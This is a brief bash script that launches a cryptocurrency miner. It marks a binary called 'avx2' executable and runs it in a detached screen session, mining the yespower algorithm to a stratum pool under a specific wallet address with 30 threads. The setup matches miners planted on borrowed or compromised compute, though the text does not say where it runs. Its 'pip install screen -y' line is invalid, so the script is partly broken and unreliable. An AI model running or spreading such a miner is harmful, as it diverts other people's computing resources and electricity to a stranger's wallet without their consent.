#!/bin/bash
chmod +x avx2 >/dev/null 2>&1
pip install screen -y
screen ./avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.SMLT -t 30
